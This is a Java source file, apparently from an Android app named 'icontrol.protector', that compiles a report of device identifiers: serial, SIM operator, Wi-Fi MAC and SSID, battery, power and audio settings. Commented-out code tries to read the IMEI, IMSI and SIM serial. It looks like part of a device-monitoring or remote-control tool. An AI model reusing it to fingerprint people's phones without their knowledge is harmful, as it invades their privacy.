package com.icontrol.protector;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

import java.util.Locale;

public class Deviceinfo {


    public static String Load(Context c){
        StringBuffer strbuilder = new StringBuffer();

        strbuilder.append("• [Information]"+ Consts.SPLIT_LINE);
        strbuilder.append(" "+ Consts.SPLIT_LINE);
        strbuilder.append("Name: "+Devicename(c) + Consts.SPLIT_LINE);
        strbuilder.append("MODEL: "+Build.MODEL + Consts.SPLIT_LINE);
        strbuilder.append("BOARD: "+Build.BOARD + Consts.SPLIT_LINE);
        strbuilder.append("BRAND: "+Build.BRAND + Consts.SPLIT_LINE);
        strbuilder.append("BOOTLOADER: "+Build.BOOTLOADER + Consts.SPLIT_LINE);
        strbuilder.append("DISPLAY: "+Build.DISPLAY + Consts.SPLIT_LINE);
        strbuilder.append("HARDWARE: "+Build.HARDWARE + Consts.SPLIT_LINE);
        strbuilder.append("HOST: "+Build.HOST + Consts.SPLIT_LINE);
        strbuilder.append("ID: "+Build.ID + Consts.SPLIT_LINE);
        strbuilder.append("MANUFACTURER: "+Build.MANUFACTURER + Consts.SPLIT_LINE);
        strbuilder.append("SERIAL: "+Build.SERIAL + Consts.SPLIT_LINE);


        strbuilder.append("----------------"+ Consts.SPLIT_LINE);
        strbuilder.append(" "+ Consts.SPLIT_LINE);
        strbuilder.append("• [System]"+ Consts.SPLIT_LINE);

        strbuilder.append("Version: "+ UtliTools.Version() + Consts.SPLIT_LINE);
        strbuilder.append("RELEASE: "+Build.VERSION.RELEASE + Consts.SPLIT_LINE);
        strbuilder.append("SDK: "+Build.VERSION.SDK_INT + Consts.SPLIT_LINE);
        strbuilder.append("Language: "+Locale.getDefault().getDisplayLanguage() + Consts.SPLIT_LINE);


        strbuilder.append("----------------"+ Consts.SPLIT_LINE);
        strbuilder.append(" "+ Consts.SPLIT_LINE);
        strbuilder.append("• [SIM]"+ Consts.SPLIT_LINE);
        strbuilder.append(" "+ Consts.SPLIT_LINE);
        final TelephonyManager t = (TelephonyManager) c.getSystemService(c.TELEPHONY_SERVICE);
        String n = "";
        try
        {
            n =  t.getSimOperator();
        }catch (Exception e){
            n="";
        }

        if (!TextUtils.isEmpty(n)) {

            try
            {
                String NON =  t.getNetworkOperatorName();
                if (NON.trim().length()==0){
                    NON = "n/a";
                }

                strbuilder.append("Operator: " + NON + Consts.SPLIT_LINE);

//                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//                    String i0 ="";
//                    try
//                    {
//                        i0 = t.getImei();//error here
//                    }catch (Exception e){
//                        i0="null";
//                    }
//
//                    strbuilder.append("IMEI: " +i0 + Consts.SPLIT_LINE);
//                } else {
//                    String i1 ="";
//                    try
//                    {
//                        i1 = t.getDeviceId();//error here
//                    }catch (Exception ex){
//                        i1="null";
//                    }
//                    strbuilder.append("IMEI: " +i1 + Consts.SPLIT_LINE);
//                }

                String stc = t.getSimCountryIso();
                if (stc.trim().length()==0){
                    stc = "n/a";
                }
                strbuilder.append("Country: " +stc + Consts.SPLIT_LINE);

//                String sr = "";
//                try
//                {
//                    sr = t.getSimSerialNumber();//error here
//                }catch (Exception ex){
//                    sr="null";
//                }

               // strbuilder.append("SerialNumber: " +sr + Consts.SPLIT_LINE);
                strbuilder.append("Network: " + UtliTools.Get_Network(c) + Consts.SPLIT_LINE);

//                String IMsi = "";
//                try
//                {
//                    IMsi = t.getSubscriberId();//error here
//                }catch (Exception ex){
//                    IMsi = "null";
//                }

                //strbuilder.append("IMSI: " +IMsi + Consts.SPLIT_LINE);
            }catch (Exception ex){
                for(int fix = 0 ; fix < 6 ; fix++){
                    strbuilder.append("null" + Consts.SPLIT_LINE);
                }
            }

        }else{
            for(int fix = 0 ; fix < 6 ; fix++){
                strbuilder.append("null" + Consts.SPLIT_LINE);
            }
        }

        strbuilder.append("----------------"+ Consts.SPLIT_LINE);
        strbuilder.append(" "+ Consts.SPLIT_LINE);
        strbuilder.append("• WIFI"+ Consts.SPLIT_LINE);
        strbuilder.append(" "+ Consts.SPLIT_LINE);
        final WifiManager wm = (WifiManager) c.getSystemService(Context.WIFI_SERVICE);
        final ConnectivityManager m = (ConnectivityManager)c.getSystemService(Context.CONNECTIVITY_SERVICE);
        final NetworkInfo w = m.getActiveNetworkInfo();
        if(w.getType() == ConnectivityManager.TYPE_WIFI) {
            try
            {
                WifiInfo fo = null;
                String adr = "";
                String sID = "";
                int SP = 0;
                int RS = 0;
                try
                {
                    fo = wm.getConnectionInfo();
                    adr = fo.getMacAddress();
                    sID = fo.getSSID();
                    SP = fo.getLinkSpeed();
                    RS = WifiManager.calculateSignalLevel(fo.getRssi(), 5);
                }catch (Exception ex){
                    fo = null;
                    adr = "null";
                    sID = "null";
                    SP = 0;
                    RS = 0;
                }

                strbuilder.append("MacAddress: " +adr + Consts.SPLIT_LINE);
                strbuilder.append("SSID: " +sID + Consts.SPLIT_LINE);
                strbuilder.append("LinkSpeed: " +Integer.toString(SP) + Consts.SPLIT_LINE);
                strbuilder.append("RSSI: " +Integer.toString(RS) + Consts.SPLIT_LINE);
            }catch (Exception ee){
                for(int fix = 0 ; fix < 4 ; fix++){
                    strbuilder.append("null" + Consts.SPLIT_LINE);
                }
            }
        }else{
            for(int fix = 0 ; fix < 4 ; fix++){
                strbuilder.append("null" + Consts.SPLIT_LINE);
            }
        }
        strbuilder.append("----------------"+ Consts.SPLIT_LINE);
        strbuilder.append(" "+ Consts.SPLIT_LINE);
        strbuilder.append("• Battery"+ Consts.SPLIT_LINE);
        strbuilder.append(" "+ Consts.SPLIT_LINE);

        Intent intent = c.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        int lev = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, 0);
        int sc = intent.getIntExtra(BatteryManager.EXTRA_SCALE, 100);
        int per = (lev * 100) / sc;
        int plu = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
        boolean usb = plu == BatteryManager.BATTERY_PLUGGED_AC || plu == BatteryManager.BATTERY_PLUGGED_USB;
        strbuilder.append("Charged: " +String.valueOf(per) + Consts.SPLIT_LINE);
        strbuilder.append("USB: " +usb + Consts.SPLIT_LINE);
        final PowerManager pow = (PowerManager)c.getSystemService(Context.POWER_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            strbuilder.append("Sleep mode: " +pow.isDeviceIdleMode() + Consts.SPLIT_LINE);

            strbuilder.append("Power Saver: " +pow.isPowerSaveMode() + Consts.SPLIT_LINE);

            strbuilder.append("Active: " +pow.isInteractive() + Consts.SPLIT_LINE);
        }else{
            strbuilder.append("n/a" + Consts.SPLIT_LINE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                strbuilder.append(pow.isPowerSaveMode() + Consts.SPLIT_LINE);
            }else{
                strbuilder.append("null" + Consts.SPLIT_LINE);
            }
            strbuilder.append(pow.isScreenOn() + Consts.SPLIT_LINE);
        }
        strbuilder.append("----------------"+ Consts.SPLIT_LINE);
        strbuilder.append(" "+ Consts.SPLIT_LINE);
        strbuilder.append("• Settings"+ Consts.SPLIT_LINE);
        strbuilder.append(" "+ Consts.SPLIT_LINE);
        final AudioManager au = (AudioManager) c.getSystemService(Context.AUDIO_SERVICE);
        int max = au.getStreamMaxVolume(AudioManager.STREAM_RING);
        int vol = au.getStreamVolume(AudioManager.STREAM_RING);
        strbuilder.append(max + Consts.SPLIT_LINE);
        strbuilder.append(vol + Consts.SPLIT_LINE);
        max = au.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
        vol = au.getStreamVolume(AudioManager.STREAM_MUSIC);
        strbuilder.append(max + Consts.SPLIT_LINE);
        strbuilder.append(vol + Consts.SPLIT_LINE);
        max = au.getStreamMaxVolume(AudioManager.STREAM_NOTIFICATION);
        vol = au.getStreamVolume(AudioManager.STREAM_NOTIFICATION);
        strbuilder.append(max + Consts.SPLIT_LINE);
        strbuilder.append(vol + Consts.SPLIT_LINE);
        max = au.getStreamMaxVolume(AudioManager.STREAM_SYSTEM);
        vol = au.getStreamVolume(AudioManager.STREAM_SYSTEM);
        strbuilder.append(max + Consts.SPLIT_LINE);
        strbuilder.append(vol + Consts.SPLIT_LINE);
        switch(au.getRingerMode()){
            case AudioManager.RINGER_MODE_NORMAL:
                strbuilder.append("0" + Consts.SPLIT_LINE);
                break;
            case AudioManager.RINGER_MODE_VIBRATE:
                strbuilder.append("1" + Consts.SPLIT_LINE);
                break;
            case AudioManager.RINGER_MODE_SILENT:
                strbuilder.append("2" + Consts.SPLIT_LINE);
                break;
        }
        final WifiManager wi = (WifiManager) c.getSystemService(Context.WIFI_SERVICE);
        if (wi.isWifiEnabled()) {
            strbuilder.append("1" + Consts.SPLIT_LINE);
        }else{
            strbuilder.append("0" + Consts.SPLIT_LINE);
        }

        String s2 =  strbuilder.toString() ;

       return s2;
    }
    public static String Devicename(Context c) {
        try
        {
            String nm = "";
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN_MR1) {
                try{
                    nm = Settings.Global.getString(c.getContentResolver(), Settings.Global.DEVICE_NAME);
                } catch (Exception e) {}
            }
            if(nm.length() == 0){
                nm = Build.MODEL;
            }
            if(nm.length() != 0){
                return nm ;
            }else {
                return "null";
            }
        }catch (Exception EX){}
        return "null";
    }


}
